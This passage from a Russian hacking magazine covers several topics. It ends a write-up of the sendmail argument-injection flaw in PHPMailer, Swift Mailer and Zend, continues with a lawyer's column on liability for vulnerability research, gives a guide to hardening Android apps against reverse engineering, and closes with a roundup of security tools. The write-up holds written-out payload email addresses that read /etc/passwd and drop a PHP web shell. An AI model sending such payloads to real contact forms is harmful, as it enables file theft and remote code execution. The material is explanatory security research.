   Остается указать путь до нужного файла и смотреть результаты в логе. На-
пример, так можно прочитать каноничный passwd: "D\' -C/etc/passwd -X/
var/www/html/PHPMailer-5.2.19/readfile.txt a"@givemeshell.com.





                                                   Чтение файлов через флаг -C


Также не забывай про ограничение длины в имени ящика. Оно должно быть
не более 64 символов.
   Вообще, советую присмотреться к конфигурационным файлам: это боль-
шое поле для дальнейших исследований. Если интересно, можешь глянуть ин-
формацию о структуре этих файлов.
  Я почти уверен, что возможен такой кейс атаки:
•  создаешь конфиг, в котором, используя флаг -М, переназначаешь мейлер
    local, указывая путь к /bin/sh;
•  загружаешь «картинку» с конфигурацией;
•  указываешь к конфигу путь через -C;
•  получаешь возможность выполнения команд.

На этом перестаю утомлять тебя теорией — переходим к практическим кейсам.

SWIFT MAILER И ZEND FRAMEWORK ПОД УГРОЗОЙ
Swift Mailer — комплексное решение для организации отправки почты. Эта би-
блиотека используется во многих серьезных проектах, среди которых такие
популярные фреймворки, как Yii 2, Laravel и Symfony.
  Проблема все та же — отсутствует фильтрация данных, которые попадают
в команду запуска sendmail. Все версии вплоть до 5.4.5-DEV уязвимы к опи-
санной выше атаке.
   Если посмотреть на патч, то сразу становится понятно, где проблемный
участок кода.
/lib/classes/Swift/Transport/MailTransport.php:





В целях демонстрации развернем тестовый стенд с Yii 2, взяв за основу yii2-
app-basic. Там есть форма обратной связи, и можно экспериментировать
с ней. К сожалению, по умолчанию включена встроенная валидация email —
она с радостью отклонит те адреса, что приводят к эксплуатации.
models/ContactForm.php:





Цель этой статьи — обратить внимание на уязвимость и ее причины, а не пре-
доставить готовый эксплоит. Поэтому, если хочешь, на досуге можешь попро-
бовать обойти проверку. Вот класс, который проводит валидацию.
   Пока же мы ее отключаем. Представим, что программист просто забыл ее
поставить. Заполняем форму обратной связи.





                                                                      Yii 2 готов к эксплуатации уязвимости

Отправляем "Dog\"  -oQ/tmp/  -X/var/www/basic/web/shell.php  as"@
givemeshell.co и получаем рабочий шелл.





                                        Выполнение произвольного кода в Yii 2

С Zend Framework абсолютно та же история. Уязвимы все версии компонен-
та zend-mail до версии 2.7.2. Если внимательно изучить патч, станет ясно,
как эксплуатировать уязвимость.

ЗАКЛЮЧЕНИЕ И ССЫЛКИ
Хочется поблагодарить Давида Голунского за интересные ресерчи, которых
в последнее время все больше. Например, повышение привилегий в MySQL
и nginx — если ты еще не ознакомился с ними, советую это сделать.
   Оригинальный документ об уязвимости в PHPMailer смотри тут. А здесь —
видеоролик с демонстрацией работы эксплоита.
   Сайт Давида вообще рекомендую добавить в закладки и регулярно туда
заглядывать.
ВЗЛОМ





  Денис Доротенко
    zakon.ru/dorotenko





  Артем Романенков
a.a.romanenkov@gmail.com

ОТВЕТЫ
ЮРИСТА
КАК ИЗБЕЖАТЬ ОТВЕТСТВЕННОСТИ
ЗА ПОИСК УЯЗВИМОСТЕЙ


Какие риски несет выявление уязвимостей в чужом софте
без согласия владельца? Можно ли за такую деятельность
влететь на штраф? Светит ли за это административная
или уголовная ответственность? Как можно минимизиро-
вать риски? Спасет ли программа Bug Bounty? Мы поста-
раемся дать ответы на эти и некоторые другие вопросы.

В 2013 году студент Деян Орниг (Dejan Ornig) обнаружил уязвимости в прото-
коле шифрования TETRA и сообщил об этом в полицейское ведомство. Два
года оно молчало, пока в 2015 году Орниг не выложил в открытый доступ ин-
формацию о своих находках. Как только про это стало известно властям, про-
тив него было выдвинуто обвинение во взломе протокола.
  В итоге Деян был признан виновным и получил пятнадцать месяцев лише-
ния свободы условно. Неожиданный поворот событий, да? Вроде бы человек
нашел уязвимости, решил сделать доброе дело, сообщил о них куда надо.
Но в результате получил такую вот «благодарность» от властей. И это далеко
не единственный пример.
   Что же ожидает человека, который занимается поиском уязвимостей в сто-
ронних продуктах? Вариантов развития событий немало. Все зависит от целей
исследования. Одно дело, когда человек берется за это «по заказу» третьих
лиц, которым подобные уязвимости нужны для собственных целей (привет,
Expocod!). Другое — когда он работает с ведома и согласия самого владельца
сервиса в рамках Bug Bounty или иного соглашения. Нередки и случаи, когда
человек находит уязвимости и пытается в обмен на информацию о них полу-
чить деньги от владельца сервиса (привет, Parallels!).
   Если с Bug Bounty все более-менее понятно (так как правила игры и допу-
стимые пределы исследования задаются владельцем сервиса), то в случае от-
сутствия договоренностей может возникнуть много вопросов, прежде всего
у самих багхантеров.

ЕСТЬ ЛИ ВООБЩЕ КАКАЯ-ТО ОТВЕТСТВЕННОСТЬ ЗА ИССЛЕДО-
ВАНИЕ И ВЗЛОМ ЧУЖОЙ ПРОГРАММЫ, СЕРВИСА, СЕТИ?
Если говорить про действующие российские законы, то да, есть. Когда ис-
следователь тестирует чужой продукт на предмет уязвимостей или проникает
в чужую сеть без ведома и согласия владельца, его действия могут быть рас-
ценены как неправомерные. И последствием таких действий может стать на-
ступление ответственности различного рода: гражданско-правовой, админи-
стративной и уголовной.

О КАКИХ ЗАКОНАХ ИДЕТ РЕЧЬ?
В большей степени исследование уязвимостей (а также возможная ответ-
ственность в случае совершения противоправных деяний) касается тех зако-
нов, которые перечислены ниже. Обрати внимание, что это не весь список:
в этой статье не затрагиваются вопросы, связанные с персональными дан-
ными, охраняемой законом тайной (государственной, врачебной, банковской
и так далее) и некоторые другие вопросы. Пока что мы поговорим о следую-
щих трех законах:
1. Гражданский кодекс;
2. Кодекс об административных правонарушениях;
3. Уголовный кодекс.

В КАКИХ СЛУЧАЯХ БАГХАНТЕР ПОНЕСЕТ ОТВЕТСТВЕННОСТЬ?
Все зависит от конкретных обстоятельств дела, а также от последствий, воз-
никших после конкретного исследования (тестирования, взлома). В зависимо-
сти от них и будет определяться, являются ли такие действия багхантера пра-
вонарушением или нет, преступлением или нет, подлежит ли он привлечению
к ответственности соответствующего рода или нет.

ЧТО НАДО ЗНАТЬ ПРО ГРАЖДАНСКО-ПРАВОВУЮ ОТВЕТСТВЕН-
НОСТЬ?
В первую очередь надо знать, что она может наступать вследствие следующих
обстоятельств:
1. Исследование повлекло за собой нарушение авторских прав.
2. В ходе исследования был причинен вред личности или имуществу.
3. Были нарушены условия использования (лицензия) исследуемого объекта.

Кейс 1. Авторские права
В большинстве случаев исследуемый сайт или программа представляет собой
полноценный объект авторских прав. Следовательно, его правообладателю
принадлежит исключительное право в отношении такого объекта (статья 1270
Гражданского кодекса РФ). Это означает, что по общему правилу именно пра-
вообладатель определяет, можно ли копировать его объект (полностью или
частично), вносить в него изменения, искажения, модифицировать его.
   Для понимания представим ситуацию: изучив сервис на уязвимости, ис-
следователь скопировал часть программного кода этого сервиса и сохранил
его на своем носителе. Такое копирование представляет собой использова-
ние объекта авторских прав (кода программы) путем его воспроизведения.
Это значит, что фактически объект авторских прав был использован исследо-
вателем без согласия на то правообладателя. Формально это будет считаться
нарушением прав последнего.
   Поэтому если в ходе исследования на уязвимости произведено (даже фраг-
ментарное) копирование, модификация, изменение, искажение исследуемого
объекта авторских прав, то формально это может быть признано нарушением
исключительного права его правообладателя на свой объект. Ниже — самый
простой пример из практики.

Условия использования материалов сайта registre.ru
www.registre.ru/copyright.html
Материалы, размещенные на сайте www.registre.ru, принадлежат ООО «Проф-
дело» и запрещены для перепечатки. В случае незаконной перепечатки мате-
риалов сайта нарушитель выплачивает правообладателю неустойку в размере
10 000 рублей за каждую статью или часть статьи.


Что понимать под «материалами», однозначно не ясно. Речи о том, что это пра-
вило касается только опубликованных статей, тоже нет. Поэтому если предста-
вить ситуацию, что при тестировании этого сайта на уязвимости какие-то мате-
риалы (будь то тексты неопубликованных статей или фрагменты программного
кода скриптов) были скопированы исследователем, то с определенными ого-
ворками можно будет считать, что при таком копировании он нарушил автор-
ские права владельца этого сайта.
   Если же говорить про размер ответственности за такое нарушение в де-
нежном выражении, то он определен в статье 1301 Гражданского кодекса РФ:
•  от десяти тысяч до пяти миллионов рублей (по усмотрению суда);
•  в двукратном размере стоимости лицензии на исследуемый объект (для его
   использования тем способом, которым он использовался в ходе исследо-
   вания).

Ответчика также могут обязать возместить правообладателю убытки, поне-
сенные им в ходе исследования. При этом закон не ограничивает размер по-
добных убытков. Поэтому если правообладатель сможет доказать их размер
(даже если он будет больше пяти миллионов), то выплачивать надо будет за-
явленную сумму. Как будут доказываться убытки — уже другой вопрос, выходя-
щий за рамки этой статьи.

Кейс 2. Вред личности или имуществу
Помимо нарушения авторских прав, ответственность предусмотрена еще
и за вред личности или имуществу (глава 59 Гражданского кодекса РФ). По об-
щему правилу вред, причиненный личности или имуществу гражданина, а так-
же вред, причиненный имуществу юридического лица, подлежит возмещению
в полном объеме лицом, причинившим вред. В свою очередь подозреваемый
освобождается от возмещения убытков, если докажет свою невиновность.
   Более наглядно это можно объяснить так. Представим ситуацию: есть про-
граммный комплекс, который отвечает за автоматическую подачу горячей
воды в жилые дома. Если исследование на уязвимости стало причиной вы-
ведения этого комплекса из строя, то владелец вправе будет рассчитывать
на взыскание с исследователя всех понесенных им убытков (включая расходы
на ремонт и повторный запуск оборудования). Если те же действия стали при-
чиной нанесения вреда имуществу в тех домах, подачу воды в которые обе-
спечивал программный комплекс, то и владельцы квартир (а также владель-
цы пострадавшего имущества в квартирах) тоже будут вправе рассчитывать
на взыскание своих убытков.
   То есть следует понимать, что если в результате тестирования будет выве-
ден из строя дорогостоящий и сложный программный продукт, то последствия
могут быть серьезными, равно как и ответственность за них. И денежные взы-
скания здесь спокойно могут превышать те пределы, о которых мы говорили,
рассматривая случаи с нарушением авторских прав.

Кейс 3. Нарушение условий использования (лицензии)
Зачастую объект исследования (будь то сайт, программное приложение или
иной сервис) имеет собственные условия использования. Они могут называть-
ся правилами использования, условиями сервиса, лицензией на программу
или по-другому. В этих условиях может быть предусмотрена дополнительная
ответственность пользователя за действия, которые он совершает по отноше-
нию к объекту исследования.
   Смотри выше пример про сайт «Профдело». Хоть там и некорректно напи-
саны положения об авторских правах, можно считать, что в этом случае для ис-
следователя как раз предусмотрена ответственность за нарушение условий
использования сайта — десять тысяч рублей за каждую статью или ее часть.
  Кроме того, может идти речь и о возмещении убытков владельцу исследуе-
мого ресурса. Пара примеров для наглядности.

Условия использования материалов сайта snob.ru
snob.ru/basement/term
Пользователь обязуется возместить убытки ООО «Сноб Медиа», включая су-
дебные расходы, обусловленные материалами Пользователя, несоблюдени-
ем положений настоящего Соглашения или нарушением прав третьих лиц, вне
зависимости от того, является ли Пользователь зарегистрированным или нет.
Пользователь несет персональную ответственность за действия при пользо-
вании Сайтом, включая, помимо прочего, оплату стоимости доступа к интер-
нету в процессе такого использования.


Условия оказания услуг
ru.besv.com/terms-of-service
5. Компенсация
При нарушении настоящих Условий обслуживания, а также других правовых
требований, в случае нарушения прав третьих лиц и при инициировании су-
дебного процесса, в результате такого нарушения, вы соглашаетесь, что Ком-
пания и ее филиалы, менеджеры, агенты, сотрудники, службы или контент-про-
вайдеры, распространители и продавцы освобождаются от юридической
ответственности в связи с таким нарушением. Также вы соглашаетесь компен-
сировать вышеперечисленным субъектам все убытки, ущерб, гражданскую от-
ветственность и расходы (включая разумные расходы на оплату услуг адвоката
и иные судебные издержки), понесенные в результате этого.



Согласно этим текстам, исследователь, действия которого приведут к убыткам
для владельцев сайтов snob.ru и ru.besv.com, может быть привлечен к ответ-
ственности за эти убытки. И если вина будет доказана, он будет вынужден воз-
местить ущерб.
   Встречаются даже ресурсы, чьи условия использования прямо содержат
запрет на поиск уязвимостей.

Правила и условия регистрации на сайте Masters of Taste
mastersoftaste.club/legal
В частности, Пользователи не должны:
<…>
пытаться оценить или проверить уязвимость Сайта, а также нарушать правила
безопасности и системы идентификации пользователей Сайта без предвари-
тельного письменного согласия Организатора.


Условия использования (оферта) сайта kartatalanta.ru
kartatalanta.ru/text/terms.php
Используя Сайт, Зарегистрированный пользователь обязуется не нарушать
или пытаться нарушать информационную безопасность Сайта, что включает
в себя:
<…>
5.2. попытки проверить уязвимость системы безопасности Сайта, нарушение
процедуры регистрации и авторизации без разрешения Исполнителя;


Поэтому перед тестированием на уязвимости конкретного программного про-
дукта нелишне будет ознакомиться с правилами его использования: посмо-
треть, не упомянуты ли в них запреты таких действий и не указана ли потенци-
альная ответственность за них.

В ЧЕМ ВЫРАЖЕНА АДМИНИСТРАТИВНАЯ ОТВЕТСТВЕННОСТЬ?
КоАП РФ содержит обширный список возможных нарушений в сфере защиты
информации, среди которых можно выделить два пункта.
  Первый — занятие видами деятельности в области защиты информации
(за исключением информации, составляющей государственную тайну) без по-
лучения в установленном порядке специального разрешения (лицензии),
если такое разрешение (такая лицензия) в соответствии с федеральным за-
коном обязательно (обязательна), — статья 13.13 КоАП. Возможная ответ-
ственность: административный штраф до одной тысячи рублей с конфискаци-
ей средств защиты информации или без таковой для физлиц, до трех тысяч
рублей для должностных лиц и до двадцати тысяч рублей с конфискацией
средств защиты информации или без таковой для юридических лиц.
   Второй пункт — разглашение информации, доступ к которой ограничен
федеральным законом (за исключением случаев, если разглашение такой
информации влечет уголовную ответственность), лицом, получившим доступ
к такой информации в связи с исполнением служебных или профессиональ-
ных обязанностей, — статья 13.14 КоАП. Возможная ответственность: адми-
нистративный штраф в размере до одной тысячи рублей для физлиц и до пяти
тысяч рублей для должностных лиц.
   Административная ответственность может налагаться отдельно от граж-
данско-правовой. То есть некоторые нарушения лежат не в гражданско-пра-
вовой плоскости, поэтому можно быть также привлеченным и к администра-
тивной  ответственности, если соответствующий  состав правонарушения
предусмотрен в КоАП.

В ЧЕМ ВЫРАЖЕНА УГОЛОВНАЯ ОТВЕТСТВЕННОСТЬ?
Уголовная ответственность за преступления в сфере компьютерной информа-
ции предусмотрена главой 28 Уголовного кодекса РФ и применяется при на-
ступлении общественно опасных последствий. Начнем со статьи 272 УК РФ.

Уголовный кодекс Российской Федерации, статья 272.
Неправомерный доступ к компьютерной информации

1. Неправомерный доступ к охраняемой законом компьютерной информации,
если это деяние повлекло уничтожение, блокирование, модификацию либо
копирование компьютерной информации, наказывается штрафом в размере
до двухсот тысяч рублей или в размере заработной платы или иного дохода
осужденного за период до восемнадцати месяцев, либо исправительными ра-
ботами на срок до одного года, либо ограничением свободы на срок до двух
лет, либо принудительными работами на срок до двух лет, либо лишением сво-
боды на тот же срок.


По ней наказуемым может быть только действие в виде доступа к охраняемой
законом компьютерной информации. Понятие доступа приведено в статье 8
Федерального закона «Об информации, информационных технологиях и о за-
щите информации» от 27.07.2006 № 149-ФЗ: под ним понимается поиск и по-
лучение любой информации в любых формах и из любых источников при усло-
вии соблюдения требований, установленных законом.
  Под компьютерной информацией (согласно ФЗ «О внесении изменений
в Уголовный кодекс Российской Федерации и отдельные законодательные
акты Российской Федерации» от 07.12.2011 № 420-ФЗ) понимаются сведения
(сообщения, данные), представленные в форме электрических сигналов, не-
зависимо от средств их хранения, обработки и передачи.
  Важно иметь в виду, что привлечение к уголовной ответственности возмож-
но только в том случае, если действия виновного повлекли материальные по-
следствия: уничтожение, блокирование, модификацию, копирование компью-
терной информации. При отсутствии таких последствий вина в совершении
преступления по статье 272 УК РФ исключается.
   Например, если гражданин Иванов, желая проверить верность девушки,
использует неправомерно добытый логин и пароль девушки, заходит на ее
электронную почту, просматривает сообщения, не копируя, изменяя или унич-
тожая информацию, то Иванов не будет нести ответственность по статье 272
УК РФ, так как в действиях Иванова не усматривается общественно опасных
последствий. Однако в таких действиях может быть другой состав преступле-
ния, который предусмотрен статьей 138 УК РФ «Нарушение тайны переписки,
телефонных переговоров, почтовых, телеграфных или иных сообщений».
   Также УК РФ предусматривает уголовную ответственность за следующие
деяния:

Уголовный кодекс Российской Федерации, статья 273.
Создание, использование и распространение вредоносных
компьютерных программ

1. Создание, распространение или использование компьютерных программ
либо иной компьютерной информации, заведомо предназначенных для не-
санкционированного уничтожения, блокирования, модификации, копирования
компьютерной информации или нейтрализации средств защиты компьютер-
ной информации, наказываются ограничением свободы на срок до четырех
лет, либо принудительными работами на срок до четырех лет, либо лишением
свободы на тот же срок со штрафом в размере до двухсот тысяч рублей или
в размере заработной платы или иного дохода осужденного за период до во-
семнадцати месяцев.

Статья 274. Нарушение правил эксплуатации средств
хранения, обработки или передачи компьютерной
информации и информационно-телекоммуникационных
сетей

1. Нарушение правил эксплуатации средств хранения, обработки или пере-
дачи охраняемой компьютерной информации либо информационно-теле-
коммуникационных сетей и оконечного оборудования, а также правил досту-
па к информационно-телекоммуникационным сетям, повлекшее уничтожение,
блокирование, модификацию либо копирование компьютерной информации,
причинившее крупный ущерб, наказывается штрафом в размере до пятисот
тысяч рублей или в размере заработной платы или иного дохода осужден-
ного за период до восемнадцати месяцев, либо исправительными работами
на срок от шести месяцев до одного года, либо ограничением свободы на срок
до двух лет, либо принудительными работами на срок до двух лет, либо лише-
нием свободы на тот же срок.


То есть применение каких-либо вредоносных программ (троянов, кейлоггеров
и прочего), равно как нарушение работы информационных сетей или оборудо-
вания в ходе исследования сервиса или иного программного продукта, может
также стать отдельным составом преступления.
   При отягчающих обстоятельствах (к примеру, действие совершено группой
лиц по предварительному сговору) либо при наступлении тяжких последствий или
использовании служебного положения наказание, как правило, усиливается.

КАК ИССЛЕДОВАТЕЛЮ СНИЗИТЬ РИСКИ ПРИВЛЕЧЕНИЯ
К ОТВЕТСТВЕННОСТИ?
Ответственность может быть исключена в ситуациях, когда действия исследо-
вателя не нарушают нормы закона, права и законные интересы третьих лиц.
Например, риски привлечения к ответственности можно снизить, когда иссле-
дование проводится с ведома и согласия владельца (правообладателя) ис-
следуемого программного продукта. Это может быть письменное согласие
с его стороны (двусторонний договор или иная письменная форма согласия,
хотя бы электронная переписка), либо это может быть общим соглашением
на ведение подобной деятельности (программа Bug Bounty как раз и будет та-
кого рода соглашением). Главное, чтобы у исследователя были в распоряже-
нии доказательства, подтверждающие согласие.
  Помимо этого, исследование не должно причинять вред личности или иму-
ществу иных третьих лиц, а также нарушать авторские права. Стоит также чи-
тать условия использования исследуемого продукта: в них могут содержаться
положения, которые могут привести к дополнительным неприятностям для ис-
следователя, если его привлекут к ответственности в судебном порядке. Эта
рекомендация справедлива в том числе для программ Bug Bounty: ведь и они
порой могут преподносить сюрпризы.
   Ну и конечно, не стоит забывать, что все зависит именно от конкретных об-
стоятельств, поэтому в разных случаях ответы на одни и те же вопросы могут
отличаться.
ВЗЛОМ





   Евгений Зобнин
   zobnin@gmail.com




ЗАЩИЩАЕМ
ANDROID-
ПРИЛОЖЕНИЕ
ОТ РЕВЕРСА
И ДЕБАГА
ПРОТИВОУГОНКА
ДЛЯ КОДА


                  — Как украсть приложение для Android?
                         — Берешь и крадешь.

Уровень пиратства в экосистеме Android таков, что гово-
рить об этом нет никакого смысла. Приложение не только
легко украсть — его легко взломать, отвязать от сервисов
проверки, отключить рекламу или даже внедрить в него
бэкдор. Выкладывая свое творение в Play Store, ты рас-
считываешь получить прибыль, а в результате даришь лю-
бителям вареза еще один хороший продукт. К счастью,
с этим вполне можно бороться.


Для рубрики «Взлом» я написал цикл статей, в которых наглядно показал, на-
сколько на самом деле легко взламываются приложения для Android. Для этого
не нужен даже дизассемблер, достаточно поверхностных знаний Java и языка
Smali. Поэтому, если твое приложение будет достаточно популярно, знай: его
украдут и путем нехитрых манипуляций активируют платные функции. А если
ты решил монетизировать его с помощью рекламы — ее отключат.
   Защитить приложение сложно, но можно. Во-первых, стоит сразу отказать-
ся от модели распространения Pro/Lite. Приложение очень легко вытащить
со смартфона, поэтому вору будет достаточно один раз купить приложение,
и дальше его можно распространять as is. Во-вторых, необходимо позаботить-
ся о защите кода от реверса. Декомпиляция Java-кода — дело простое, а изме-
нение бинарного кода не требует каких-то особых навыков или инструментов.
В-третьих, нужно сделать так, чтобы в случае даже успешного взлома прило-
жение просто не стало работать. Тогда взломщику придется решать сразу две
задачи: взломать приложение и заставить взломанную версию работать.
   Итак, отказываемся от Pro-версии и начинаем борьбу.

СКРЫВАЕМ И ЗАПУТЫВАЕМ КОД
Лучший способ защиты кода приложения от реверса — это обфускация, дру-
гими словами — запутывание байт-кода так, чтобы реверсеру было невыноси-
мо трудно в нем разобраться. Существует несколько инструментов, способ-
ных это сделать. Наиболее простой, но все же эффективный есть в составе
Android Studio. Это ProGuard.
   Для его активации достаточно добавить в раздел android    buildTypes
release файла build.gradle строку minifyEnabled true:





После этого Android Studio начнет пропускать все «релизные» сборки через
ProGuard. В результате приложение станет компактнее (благодаря удалению
неиспользуемого кода), а также получит некоторый уровень защиты от ревер-
са. «Некоторый» в том смысле, что ProGuard заменит имена всех внутренних
классов, методов и полей на одно-двухбуквенные сочетания. Это действи-
тельно существенно затруднит понимание декомпилированного/дизассем-
блированного кода.





                Так выглядят классы в декомпиляторе JADX после применения ProGuard

Следующий шаг — шифрование строк. Это особенно полезно в том случае,
если внутри приложения ты хранишь какие-либо сенситивные данные: иденти-
фикаторы, ключи, REST API endpoints. Все это поможет взломщику сориенти-
роваться в твоем коде или вычленить из него важную информацию.
   Зашифровать строки можно разными способами, например используя ин-
струменты Stringer или DexGuard. Преимущество: полностью автоматизиро-
ванная модификация уже имеющегося кода с целью внедрения шифрования
строк. Недостаток: цена, которая доступна компаниям, но слишком высока
для независимого разработчика.
   Поэтому мы попробуем обойтись своими силами. В простейшем случае
шифрование строк средствами Java выполняется так:





А расшифровка — так:





Для генерации ключа достаточно одной строки:





Смысл в том, чтобы написать простенькое настольное/мобильное приложе-
ние на Java, которое возьмет на вход все твои строки и выдаст на выходе их
зашифрованные варианты. Далее ты вставляешь эти строки в основное при-
ложение вместо оригинальных и в местах, где происходит к ним обращение,
вызываешь функцию decryptString().
  В результате взломщик просто не сможет увидеть зашифрованные строки,
декомпилировав приложение. Но, конечно же, сможет написать простейший
дешифратор, основанный на декомпилированном коде твоего шифратора.
Другими словами, это не панацея, но еще один уровень сложности шифрова-
ние строк добавит.
  Можно пойти еще дальше и воспользоваться одним из инструментов ком-
плексной защиты Android-приложений, например AppSolid. Стоит оно опять
же дорого, но позволяет зашифровать все приложение целиком. Это действи-
тельно способно отпугнуть многих реверсеров, однако есть ряд инструментов,
в том числе платный Java-декомпилятор JEB, который умеет снимать такую за-
щиту в автоматическом режиме.
   Также ты можешь попытаться разбить свое приложение на множество не-
больших модулей, как я уже писал в статье FIXME. Сам по себе это не метод
защиты, и он почти не затруднит работу реверсера. Но зато обломает различ-
ные автоматизированные системы кракинга приложений. Они просто не смо-
гут понять, где искать находящийся в модуле код.
   Ну и последнее: из кода необходимо обязательно удалить (закомментиро-
вать) все обращения к логгеру, то есть все вызовы Log.d(), Log.v() и так да-
лее. Иначе взломщик сможет использовать эту информацию, чтобы понять ло-
гику работы приложения.

КРАШИМ ВЗЛОМАННОЕ ПРИЛОЖЕНИЕ
Окей, жизнь реверсеру мы немного подпортили. Настало время сделать это
еще раз! Но как узнать, было ли приложение взломано? Точнее, как оно само
может это выяснить? Ведь понятия «взломанное» и «не взломанное» суще-
ствуют только в наших с тобой головах, то есть это понятия достаточно высо-
кого порядка, которые не описать алгоритмически.
   Так оно, да не так. Дело в том, что внутри APK-файла есть набор мета-
данных, которые хранят контрольные суммы абсолютно всех файлов пакета,
а сами метаданные подписаны ключом разработчика. Если изменить прило-
жение и вновь его запаковать, метаданные пакета изменятся и пакет придет-
ся подписывать заново. А так как твоего ключа разработчика у реверсера нет
и быть не может, он использует либо случайно сгенерированный, либо так на-
зываемый тестовый ключ.
  Сам Android такое приложение спокойно проглотит (он не держит базу всех
цифровых подписей всех возможных Android-разработчиков), но у нас-то есть
своя цифровая подпись, и мы можем ее сверить!

Сверяем цифровую подпись
Собственно, метод довольно простой. Тебе необходимо вставить в приложе-
ние код, который будет получать хеш ключа текущей цифровой подписи паке-
та и сравнивать его с ранее сохраненным. Совпадают — приложение не было
перепаковано (и взломано), нет — бьем тревогу.
   Для начала вставь следующий кусок кода в приложение (чем глубже ты его
запрячешь, тем лучше):





Собери, запусти приложение и посмотри лог исполнения. Там ты увидишь
строку SIGNATURE: 478uEnKQV+fMQT8Dy4AKvHkYibo=. Это и есть хеш. Его не-
обходимо не просто запомнить, а поместить в код приложения в виде констан-
ты, например под именем SIGNATURE. Теперь убери строку Log.e... из кода
и добавь следующий метод:




Он как раз и будет сверять сохраненный хеш с хешем ключа, которым в дан-
ный момент подписано приложение. Функция возвращает true, если цифровая
подпись твоя (приложение не было пересобрано), и false — если оно подвер-
глось модификации. Что делать во втором случае — решать тебе. Ты можешь
просто завершить приложение с помощью os.exit(0) либо «уронить» его, на-
пример вызвав метод неинициализированного объекта или обратившись к не-
существующему значению массива.
  Но запомни: взломщик может просто вырезать твой код сверки цифровой
подписи и он никогда не сработает (это справедливо и в отношении кода, при-
веденного далее). Поэтому спрячь его в неочевидном месте, а хеш оригиналь-
ного ключа зашифруй, как было показано выше.





                                                     Искомый хеш ключа

Проверяем источник установки
Еще один метод защиты — выяснить, откуда было установлено приложение.
Тут логика простая: если источник установки — Play Store, то все нормально,
это оригинальное неперепакованное приложение. Если нет — варез, скачан-
ный с форума и установленный с карты памяти или из «черного маркета».
   Выяснить, откуда было установлено приложение, можно в одну строку,
а сама функция, делающая это, может выглядеть так:





Как обычно: true — все нормально, false — Хьюстон, у нас проблемы.

Определяем эмулятор
Некоторые методы реверса приложений предполагают использование эмуля-
тора. Поэтому нелишним будет внести в приложение код, проверяющий, не за-
пущено ли оно в виртуальной среде. Сделать это можно, прочитав значение
некоторых системных переменных. Например, стандартный эмулятор Android
Studio устанавливает такие переменные и значения:





Поэтому, прочитав значения этих переменных, можно предположить, что код
исполняется в эмуляторе:





Обрати внимание, что класс android.os.SystemProperties скрытый и недоступен
в SDK, поэтому для обращения к нему мы используем рефлексию (о скрытых
API Android я уже писал).
   Также имей в виду, что существует огромное количество других эмуляторов
Android и в них значения переменных могут отличаться. Данный код способен
обнаружить только стандартный эмулятор Android.

Отладка
Еще один метод реверса — это запуск приложения под управлением отлад-
чика. Взломщик может декомпилировать твое приложение, затем создать
в Android Studio одноименный проект, закинуть в него полученные исходники
и просто запустить отладку, не компилируя проект. В этом случае приложение
само покажет ему свою логику работы.
   Чтобы защититься от отладки, можно использовать следующий код:





      Так делать не стоит, код проверок необходимо раскидать по коду и продублировать


ВЫВОДЫ
Создать на 100% защищенное приложение у тебя не получится, можешь даже
не пытаться. Но есть достаточно простые способы существенно усложнить
жизнь среднестатистическому реверсеру. Да, приложение все равно рано или
поздно взломают, но так у тебя хотя бы будет время, чтобы заработать на нем.
Ну и стоит почаще обновлять свое творение, чтобы реверсерам жизнь медом
не казалась.
ВЗЛОМ





                                 Дмитрий «D1g1» Евдокимов,
                                                                Digital Security
                                               @evdokimovds





СОФТ ДЛЯ ВЗЛОМА И АНАЛИЗА БЕЗОПАСНОСТИ





                         WARNING

                                    Внимание! Информация
                                          представлена
                                     исключительно с целью
                                     ознакомления! Ни авторы,
                                     ни редакция за твои
                                     действия ответственности
                                           не несут!





                 KASLRFINDER
                         KASLRfinder — это небольшая утилита, которая мо-
                       жет быть использована для поиска в памяти Windows
                      10 ядра и загруженных драйверов, несмотря на ба-
                      зовые адреса, рандомизированные таким механиз-
                      мом, как Kernel Address Space Layout Randomization
                         (KASLR). Инструмент может запускаться как обыч-
                        ная программа и не требует привилегий админи-
                         стратора.
                          Инструмент  работает  на  основе  време-Автор:
                       ни  выполнения  неудачных  инструкций  внутриUlf Frisk
                            Transactional Synchronization Extensions (TSX) бло-
                              ка. TSX был впервые введен в процессорах на базеURL:
                            Haswell, но был отключен из-за некоторых проблем.github.com/ufrisk/kaslrfinder
                       Инструкции TSX доступны на всех процессорах
                            Skylake. Для получения более детальной инфор-Система:
                     мации советуем ознакомиться с записями РафаляWindows
                        Войтчука (Rafal Wojtczuk) из Bromium Labs или пре-
                       зентацией c Black Hat.
                            KASLRfinder способен:
                         •  найти адрес ядра в пределах допустимой по-
                         грешности 1 Мбайт;
                         •  найти драйвер или адрес модуля точно, исполь-
                             зуя сигнатурный поиск;
                         •  создать новые сигнатуры.

                      Системные требования:
                         •  Skylake CPU или более новый (некоторые Haswells
                           также могут работать);
                         •  Windows 10 64-bit.

                     Подробнее об инструменте можно узнать из поста
                      Windows 10 KASLR Recovery with TSX.




                ПРОВЕРКА WAF
                           LightBulb — это фреймворк на Python с открытым
                      исходным кодом для аудита Web Application Firewalls
                        (WAF, файрволов уровня веб-приложения). Фрейм-
                        ворк состоит из двух основных алгоритмов:
                         • GOFA — алгоритм активного обучения, который
                           позволяет анализировать программы удаленно,
                            то есть запрашивать нужную программу и изу-
                             чать вывод;
                         •  SFADiff — алгоритм дифференциального  те-
Автор:                          стирования черного ящика на основе обучения
George Argyros, Ioannis Stais                          символических конечных автоматов (SFA). Вы-
                            являть различия между программами с анало-
URL:                           гичной функциональностью — одна из важных
github.com/lightbulb-                        проблем безопасности: такие различия могут
framework/lightbulb-                          быть использованы для снятия цифрового от-
framework                            печатка (fingerprinting) или обхода атак против
                   ПО для безопасности, такого как WAFs, предна-
Система:                         значенные для обнаружения вредоносных вход-
Linux                          ных данных для веб-приложений.

                       Инструмент впервые был представлен на  кон-
                     ференции  Black  Hat Europe 2016 в презента-
                      ции Another Brick Off the Wall: Deconstructing Web
                            Application Firewalls Using Automata Learning (pdf)
                      и whitepaper (pdf).




                WEPWNISE
                     WePWNise — это proof-of-concept Python-скрипт,
                       который  генерирует  архитектурно независимый
                       VBA-код для использования в документах Office или
                       шаблонах. Помогает автоматизировать обход меха-
                      низмов контроля и предотвращения эксплуатации
                        в программном обеспечении.
                          Инструмент  перечисляет  Software  Restriction
                              Policies (SRPs) и присутствие EMET и динамиче-
                        ски идентифицирует наиболее подходящие би-
Автор:                      нарные файлы для инжекта  payload. WePWNise
Vincent Yiu                        интегрируется с фреймворками эксплуатации (на-
                       пример, Metasploit, Cobalt Strike), также он прини-
URL:                       мает любые пользовательские полезные нагрузки
github.com/mwrlabs/                        в raw-формате.
